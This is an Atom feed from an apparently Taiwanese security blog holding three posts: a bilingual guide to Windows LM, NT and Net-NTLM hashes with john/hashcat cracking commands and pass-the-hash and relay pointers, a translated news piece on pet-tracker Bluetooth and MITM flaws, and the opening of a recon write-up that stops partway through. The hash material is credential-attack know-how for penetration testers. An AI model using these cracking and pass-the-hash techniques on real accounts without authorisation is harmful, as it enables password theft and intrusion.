<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.1">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-07-10T00:25:31+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">LM, NTLM, Net-NTLMv2 我的天呀！</title><link href="https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2.html" rel="alternate" type="text/html" title="LM, NTLM, Net-NTLMv2 我的天呀！" /><published>2018-07-07T00:00:00+08:00</published><updated>2018-07-07T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2</id><content type="html" xml:base="https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2.html">&lt;h1 id=&quot;lm-ntlm-net-ntlmv2-oh-my&quot;&gt;LM, NTLM, Net-NTLMv2, oh my!&lt;/h1&gt;

&lt;p&gt;When attacking AD, passwords are stored and sent in different ways, dependeing on both where you find it and the age of the domain. Most of these hashes are confusingly named, and both the hash name and the authentication protocol is named almost the same thing. It doesn’t help that every tool, post and guide that mentions credentials on Windows manage to add to the confusion. This is my attempt at clearing things up.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;當攻擊 AD 時通行碼被用各種不同的方式儲存與傳送，視你在哪找到跟 domain 的年紀而定。大部分的雜湊的命名都很讓人疑惑，而且雜湊名稱與驗證協議幾乎是一樣的稱呼。在任何工具、文章及指南中提到 Windows 身分驗證資時更增加了困惑度。&lt;a href=&quot;https://xkcd.com/927/&quot;&gt;弄清楚些事情&lt;/a&gt;，是我的主要目的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This post is geared towards pentesters in an AD environment, and it favors practical attacks against the different hash formats. A lot of inspiration is taken from byt3bl33der’s awesome article, “Practical guide to NTLM Relaying in 2017”. If I’m missing something, please hit me up.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;這篇是滲透測試者置身於 AD 環境面向的文章，而且偏向於對於不同雜湊格式的實際攻擊。受到 byt3bl33der 超棒的文章 “&lt;a href=&quot;https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html&quot;&gt;Practical guide to NTLM Relaying in 2017&lt;/a&gt;” 超大的啟發，如果我漏了什麼請&lt;a href=&quot;https://twitter.com/petergombos&quot;&gt;讓我知道&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;All example hashes are from Hashcat’s example hashes page. The hashes I’m looking at is LM, NT, and NTLM (version 1 and 2).&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;所有的範例雜湊都是從 Hashcat 的&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;範例雜湊頁面&lt;/a&gt;來的。我正在研究的雜湊是 LM, NT 及 NTLM(版本 1 跟 2)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;lm&quot;&gt;LM&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;LM-hashes is the oldest password storage used by Windows, dating back to OS/2 in the 1980’s. Due to the limited charset allowed, they are fairly easy to crack. You can obtain them, if still available, from the SAM database on a Windows system, or the NTDS database on the Domain Controller. LM was turned off by default starting in Windows Vista/Server 2008, but might still linger in a network if there older systems are still used. It is possible to enable it in later versions through a GPO setting (even Windows 2016/10).&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;時間回溯到 1980 年代的 OS/2，LM 雜湊是 Windows 所使用最古老的通行碼儲存方式。因為字元集的限制，他們很容易被破解。你可以在 Windows 系統上的 SAM 資料庫或是 Domain 控制伺服器的 NTDS 資料庫輕易地取得。LM 從 Windows Vista/Server 2008 開始預設是關閉的，但還是有可能徘徊一個擁有古老一點的系統網路中。在新一點的版本中可以 &lt;a href=&quot;https://support.microsoft.com/en-us/help/299656/how-to-prevent-windows-from-storing-a-lan-manager-hash-of-your-passwor&quot;&gt;GPO 設定&lt;/a&gt;開啟(在 Windows 2016/10 也可以)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When dumping the SAM/NTDS database, they are shown together with the NTHash, before the colon.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;將 SAM/NTDS 的資料倒出來的時候，你會看到分號前的是 NT 雜湊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例如&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;299BD128C1101FD6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Convert all lower case to upper case
2. Pad password to 14 characters with NULL characters
3. Split the password to two 7 character chunks
4. Create two DES keys from each 7 character chunk
5. DES encrypt the string &quot;KGS!@#$%&quot; with these two chunks
6. Concatenate the two DES encrypted strings. This is the LM hash.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 將所有的字元轉成大寫
2. 用 NULL 字元將通行碼補到 14 個字元
3. 將通行碼分成兩堆，一堆 7 個字元
4. 為兩堆通行碼各產生一個 DES 密鑰
5. 兩堆跟字串&quot;KGS!@#$%&quot;一起做 DES 加密
6. 將兩個 DES 加密後的字串串在一起。這就是 LM 雜湊。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;破解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;nthash-aka-ntlm&quot;&gt;NTHash (A.K.A NTLM)&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes you can use to pass-the-hash.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;這是當前流行的 Windows 系統所使用的通行碼儲存方式，可以從 SAM 資料庫倒出來或使用 Mimikatz 來取得。他們也被存在 Domain 控制伺服器上的 NTDS 檔案中。這是你可以用來 &lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot;&gt;pass-the-hash&lt;/a&gt; 的雜湊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Usally pepole call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). I personally recommend to call it the NTHash, to try to avoid confusion.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;通常人們稱之為 NTLM 雜湊(或就是 NTLM)，當 Miscrosoft 提到這個 NT 雜湊(至少在某些地方)的時候非常的誤導。我個人建議稱它為 NT 雜湊以避免混淆。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例子&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;B4B9B02E6F09A9BD760F388B67351E2B&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MD4(UTF-16-LE(password))&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;UTF-16-LE is the little endian UTF-16. Windows used this instead of the standard big endian, because &lt;em&gt;Microsoft&lt;/em&gt;.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;UTF-16-LE 是 逆序(編按:小頭端)版本的 UTF-16。Windos 使用這個而非順序(編按: 大頭端)，因為它是&lt;em&gt;微軟&lt;/em&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;破解它&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ntlmv1-aka-net-ntlmv1&quot;&gt;NTLMv1 (A.K.A Net-NTLMv1)&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and what is available. The Wikipedia page on NT Lan Manager has a good explanation.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;NTLM 協議在伺服器與客戶端挑戰/回應中使用 NT 雜湊。版本1基於設定與可用性來決定是否同時使用了 NT 與 LM 雜湊，維基百科上關於 &lt;a href=&quot;https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1&quot;&gt;NT 內網管理者&lt;/a&gt;有很好的解釋。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A way of obtaining a response to crack from a client, Responder is a great tool. The value to crack would be the &lt;code class=&quot;highlighter-rouge&quot;&gt;K1 | K2 | K3&lt;/code&gt; from the algorithm below. Version 1 is deprecated, but might still be used in some old systems on the network.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;一個從客戶端取得回應並破解的方法，&lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;Responder 是一個很好用的工具&lt;/a&gt;。需要破解的值將會是下面演算法提到的 &lt;code class=&quot;highlighter-rouge&quot;&gt;k1 | k2 | k3&lt;/code&gt;。版本1已經不建議使用了，但仍舊可能會被一些網路上老舊的系統使用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例子&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;u4-
netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1, C) | DES(K2, C) | DES(K3, C)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 8 個位元組的伺服器挑戰，隨機的
K1 | K2 | K3 = LM/NT 雜湊 | 5 位元組個 0
response = DES(K1, C) | DES(K2, C) | DES(K3, C)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;打破它&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ntlmv2-aka-net-ntlmv2&quot;&gt;NTLMv2 (A.K.A Net-NTLMv2)&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, only different algorithm and responses sent to the server. Also captured through Responder or similar. Defualt in Windows since Windows 2000.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;這是 NTLM 協議最新並且改進過的版本，讓它更難被破解。整個概念跟 NTLMv1 一樣，只有送回伺服器的演算法與回應不同。還是可以用 Responder 或是類似工具擷取到。從 Windows 2000 預設開啟。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例子&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SC = 8 位元組伺服器的挑戰，隨機的
CC = 8 位元組客戶端的挑戰，隨機的
CC* = (X, time, CC2, domain 名稱)
v2-Hash = HMAC-MD5(NT-Hash, 使用者名稱, domain 名稱)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;搞它&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;in-summary--總結&quot;&gt;IN SUMMARY / 總結&lt;/h2&gt;

&lt;p&gt;LM-and NT-hashes are ways Windows stores passwords. NT is confusingly also known as NTLM. Can be cracked to gain password, or used to pass-the-hash.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;LM 與 NT 雜湊是Windows 不同儲存通行碼的方式。NT 本身是非常令人疑惑的也被當成是 NTLM。可以被破解並取得通行碼，或是用在 pass-the-hash。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;NTLM-v1/v2 are challenge response protocols used for authentication in Windows environments. These use the NT-hash in the algorithm, which means it can be used to recover the password through Brute Force/Dictionary attacks. They can also be used in a relay attack, see byt3bl33d3r’s article [1].&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;NTLM-v1/v2 是挑戰與回應協議，用來在 Windows 環境中認證用的。這些在演算法中用了 NT 雜湊，表示可以用窮舉/字典攻擊來取得通行碼。也可以被用在轉傳攻擊，可以看看 byt3bl33d3r 的文章[1]。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you’re still confused, I would recommend reading the Wikipedia articls. I do hope this intro clears up the confusing language and can somehow help you.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;如果你還是很疑惑，我推薦你讀維基百科的文章。我希望這個簡介解開了一些疑惑，並可以幫助到你們。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;sources--資料來源&quot;&gt;Sources / 資料來源&lt;/h3&gt;

&lt;p&gt;[1] https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html&lt;/p&gt;

&lt;p&gt;[2] https://technet.microsoft.com/en-us/library/dd277300.aspx#ECAA&lt;/p&gt;

&lt;p&gt;[3] https://en.wikipedia.org/wiki/LAN_Manager&lt;/p&gt;

&lt;p&gt;[4] https://en.wikipedia.org/wiki/NT_LAN_Manager&lt;/p&gt;

&lt;p&gt;[5] https://en.wikipedia.org/wiki/Security_Account_Manager&lt;/p&gt;

&lt;p&gt;[6] https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/p&gt;</content><author><name>jhe</name></author><category term="Windows" /><category term="NT-Hash" /><summary type="html">LM, NTLM, Net-NTLMv2, oh my!</summary></entry><entry><title type="html">寵物追踪器對MITM攔截攻擊毫不設防</title><link href="https://security-onigiri.github.io//2018/06/12/mitm.html" rel="alternate" type="text/html" title="寵物追踪器對MITM攔截攻擊毫不設防" /><published>2018-06-12T00:00:00+08:00</published><updated>2018-06-12T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/06/12/mitm</id><content type="html" xml:base="https://security-onigiri.github.io//2018/06/12/mitm.html">&lt;p&gt;&lt;a href=&quot;https://threatpost.com/author/sealstara/&quot;&gt;Tara Seals&lt;/a&gt; ‧ 2018年5月25日下午3:25&lt;/p&gt;

&lt;p&gt;家寵與我們非常親近，所以智慧頸環和其他能跟踪他們位置的動物裝置變得越來越流行;畢竟一個無需張貼丟失寵物傳單的世界絕對是個美好的世界，對吧？但研究人員指出這些裝置的問題，在於這些裝置可能會洩露敏感信息，例如電話號碼，寵物的位置或家庭網路的拓樸。&lt;/p&gt;

&lt;p&gt;在檢查了包括 Kippy Vita，Nuzzle Pet Activity 和 GPS Tracker 以及 Whistle 3 GPS 寵物追踪與活動監控器 在內幾款經過充分審查的型號後，卡巴斯基實驗室的測試人員發現了一些應該讓Rover消費者注意的問題。&lt;/p&gt;

&lt;h2 id=&quot;憂鬱的藍牙&quot;&gt;&lt;strong&gt;憂鬱的藍牙&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在檢查了一些追踪器後發現一個常見問題，這些問題被歸結為使用了專為低功耗物聯網傳感器應用所定制的”藍牙低功耗”（ BLE ）。 BLE 實質上是將這些寵物追蹤器連接到所有者的智慧型手機上，但其並不完全遵照藍牙的實施規範，BLE不需要認證就可以配對設備。&lt;/p&gt;

&lt;p&gt;研究人員 Roman Unuchek 和 Roland Sako 在本週發布一份概述他們研究的報告中說：「驗證完全取決於設備的開發人員，而過往經驗表明它經常被忽視。」&lt;/p&gt;

&lt;p&gt;例如， Nuzzle 設備使用 SIM 卡傳輸寵物的 GPS 坐標，通過 BLE 直接連接到智能手機 - 無需任何授權或存取控制。這意味著任何智能手機都可以連接到追蹤器來控制它並訪問寵物的位置，以及設備狀態信息，例如溫度和電池電量（ CVE-2018-7043 ）。&lt;/p&gt;

&lt;p&gt;Whistle 3 同時也存在 BLE 連接問題。該裝置可以通過其內置的 SIM 卡或 Wi-Fi 將其 GPS 坐標傳輸到其伺服器（如果裝置擁有者提供 Wi-Fi 網路密碼）或通過 BLE 直接向裝置擁有者的智慧型手機傳輸 GPS 坐標。在後一點上，該裝置在與智慧型手機配對之前會等待一系列的動作交互，但那些動作對於第三方來說只是簡單的推斷就可重現，從而獲得對裝置的訪問權限。&lt;/p&gt;

&lt;p&gt;在這流程完成之後，這些追踪器即準備接收並執行任何命令; 例如駭客可能會要求設備的坐標位置。&lt;/p&gt;

&lt;p&gt;這些有 BLE 前端追蹤器之中唯一例外的是 Link AKC 追踪器。雖然它通過 GPS 監測寵物的位置，並通過內置 SIM 卡將坐標直接通過 BLE 傳輸到手機，但它使用用戶 ID 來驗證移動應用與追蹤器接口的權限。追蹤器還會檢查智能手機的 MAC 地址，作為用戶身份認證的另一層防護。&lt;/p&gt;

&lt;p&gt;研究人員說：「該開發者在確保與智能手機的連接方面做了一切正確的事情。」 「我們找不到任何重大問題，這對於支持 BLE 的設備來說是很少見的事。」&lt;/p&gt;

&lt;p&gt;此外， Kippy Vita 設備根本不與智能手機直接連接，所以完全沒有BLE問題，而且特別的一點是它使用 SSL 鎖定。 Tractor 和 Weenect WE301 都不能直接與智能手機通信，而是通過內置的 SIM 卡將寵物坐標傳輸到伺服器上。這對於設備的安全非常有幫助。&lt;/p&gt;

&lt;h2 id=&quot;mitm-問題&quot;&gt;&lt;strong&gt;MITM 問題&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;除了 BLE 漏洞之外，一些追踪器還存在共享憑證處理和數據傳輸機制的缺陷。只有一個 Android 應用程式通過測試， Android 應用程式（ Weenect WE301 ）會驗證其伺服器的憑證，而其他應用程式很容易受到中間人（ MITM ）攻擊。&lt;/p&gt;

&lt;p&gt;除了不驗證憑證之外，許多應用程式（包括 Nuzzle ， Link AKC 和Whistle 3 ）都可以存儲未加密的數據，或將未加密的數據傳輸到logcat 文件中。該數據可能包括應用程式的授權 token，寵物的位置和用戶註冊數據（包括姓名和電子郵件地址）。因此，一個發起 MITM 攻擊的駭客可以攔截數據傳輸或直接獲取到文件。&lt;/p&gt;

&lt;p&gt;Kippy Vita 的 Android 應用程式在將重要數據保存到自己的文件夾之前會對其進行加密，但它會記錄傳輸到伺服器的數據。&lt;/p&gt;

&lt;p&gt;研究中的兩個設備似乎可以避免被卡巴斯基申報 CVE：Tractive 和 Weenect WE301 。然而，不幸的是研究發現其 Android 應用程式也不會驗證伺服器憑證，它們以未加密的形式存儲身份驗證 token 和寵物的移動數據。&lt;/p&gt;

&lt;p&gt;也就是說，即使日誌記錄問題因為在 Android 4.1 和更新版本中，只有一些具有超級用戶權限的系統應用或應用可以讀取其他程序的日誌而有些許緩解，但仍存在其問題。&lt;/p&gt;

&lt;p&gt;研究人員說：「應該指出的是，這些數據雖然並不容易被竊取，這是因為其他應用程式無法讀取它，但是有些木馬可以通過利用超級用戶權限從其他應用盜取數據。」&lt;/p&gt;

&lt;h2 id=&quot;其他問題&quot;&gt;&lt;strong&gt;其他問題&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;同時，其中兩個追踪器可以被停用或隱藏自身不讓所有者找到。&lt;/p&gt;

&lt;p&gt;例如，可以通過更改 DAT 文件中的雜湊值來在 Nuzzle 追蹤器上安裝修改後的軟體 - 這可以用來使該設備停止運作。也許最糟糕的是，只需通過智慧型手機連接到追蹤器，攻擊者就可以隱藏寵物的位置。&lt;/p&gt;

&lt;p&gt;「為了節省電池電量，如果工具已經成功通過 BLE 發送，它就不會通過行動網路來傳輸坐標，」Unuchek 和 Saco 說。&lt;/p&gt;

&lt;p&gt;攻擊者也可以隱藏 Whistle 3 來不讓寵物主人找到。如果駭客持續傳輸設備位置的命令，該裝置將不會通過 SIM 卡來發送位置數據，因為它會假定這些數據已被直接接收。而且，它還無需任何身份驗證就可以將數據傳輸到伺服器，因此攻擊者可以用假寵物坐標來替換。&lt;/p&gt;

&lt;h2 id=&quot;這只是又一個對物聯網安全的警示&quot;&gt;&lt;strong&gt;這只是又一個對物聯網安全的警示&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;當相互連接的東西越來越深入到我們的日常生活中，從恆溫器到亞馬遜 Echo 或洗衣機/烘乾機等各種設備，現在都在為消費者提供便利和安全的應用程式，想讓他們的生活變得更加輕鬆 - 並且更加易於使用。寵物追蹤器類連接的裝置為這個進步訴求增加了一層陰影，但要求對這些漏洞關注聲浪可能會提醒製造商對問題做出應對。&lt;/p&gt;

&lt;p&gt;Synopsys 首席安全工程師 Chris Clark 告訴 Threatpost ：「誰知道 FIDO 何時會決定自己去檢查他們的藍牙LE 和支援 cellular 的 GPS 是否可被網路攻擊者當做切入點？在物聯網設備上實現安全性需要多層次的方法，加密流量或啟用身份驗證只是其複雜難題的一部分。在急於上市時，開發人員常忽略了本研究中突出顯示的許多細微差別。研究人員展示了在產品開發團隊中建立安全開發的能力是多麼重要，或是與值得信賴的合作夥伴一起工作，而這些合作夥伴在將產品推向市場之前具有應對網路安全挑戰的經驗和能力。」&lt;/p&gt;

&lt;p&gt;※註:Fast Identification Online ( FIDO ) 
※註:Cellular 代表著支援 4G LTE、3G、 HSPA、HSPA+ 和 DC-HSDPA 行動網路之統稱。&lt;/p&gt;

&lt;p&gt;他補充說，雖然這項研究的重點是 GPS 和 BLE ，但攻擊路徑中的弱點可以在多個行業的產品中找到。&lt;/p&gt;

&lt;p&gt;他說：「這項研究突顯了物聯網領域面臨的更大挑戰，我如何生產安全的物聯網設備？儘管一些設備採取一些措施解決了他們所謂的『安全問題』，但研究人員仍然發現每台設備上的其他區域都存在數據洩露和故障。尋求安全性和可用性之間的平衡對於嵌入式物聯網產品開發人員來說仍然是一個挑戰。在很多情況下，使用靜態代碼分析和模糊測試都可能會發現這些漏洞，並確保寵物安全回家。」&lt;/p&gt;

&lt;p&gt;Comparitech.com 隱私權倡導者 Paul Bischoff 告訴我們，考慮到對於消費者而言，了解其連接設備的安全狀態是一項挑戰，這一點尤為重要。與我們的智慧型手機和電腦上的網路瀏覽器不同，沒有綠色的鎖可以告訴您，您的物聯網設備是否已連接到正確的伺服器，以及所發送的數據是否已加密。這意味著普通人無法知道駭客是否正在竊取有關追踪器的位置或其他隱私訊息。出於這個原因，物聯網製造商在安全方面需要加強他們的遊戲規則。&lt;/p&gt;

&lt;p&gt;本文於 5/29/2018 於 6:11 ET 更新，更新內容來自 Synopsys 和 Comparitech.com 在物聯網安全上的評論。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="BLE" /><category term="IOT" /><category term="Mobile APP" /><summary type="html">Tara Seals ‧ 2018年5月25日下午3:25</summary></entry><entry><title type="html">用偵查來PWN解後端控制台</title><link href="https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel.html" rel="alternate" type="text/html" title="用偵查來PWN解後端控制台" /><published>2018-05-15T00:00:00+08:00</published><updated>2018-05-15T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel.html">&lt;p&gt;偵察是滲透測試中有趣且最重要的部分。良好的使用偵察，可以有效的查找到 API 端口、相關敏感文件或文件夾、鮮嫩多汁的子網域 (編註:原文如此) 等等。在我最近一次的研究中發現了一個由於缺少授權管理甚至敏感文件還設為公開的目標，這使我能夠輕易進入其管理控制台。&lt;/p&gt;

&lt;p&gt;讓我首先從靜態分析 iOS 應用程式開始。在瀏覽&lt;a href=&quot;https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html#//apple_ref/doc/uid/TP40009252-SW1&quot;&gt;Info.plist&lt;/a&gt;時，我們可以看到裡面有一個寫死的 URL。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[nishaanthguna:~/pentest]$ cat Info.plist | grep -i &quot;http&quot;
&amp;lt;!DOCTYPE plist PUBLIC .. &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;string&amp;gt;https://admin.company.com/xyz/api&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;以此為憑依繼續追查這個URL下去，我們得到一個連結到 Swagger UI 的頁面。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gxdQJhr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然後我們粗略的翻一翻&lt;a href=&quot;https://swagger.io/swagger-ui/&quot;&gt;官方文件&lt;/a&gt;，我們可以看到 Swagger UI 是個用於可視化處理和與 API 互動的資源，它會自動根據載明之規範產生交互。以下是在檢查上一個 UI 頁面時找到的 URL。&lt;/p&gt;

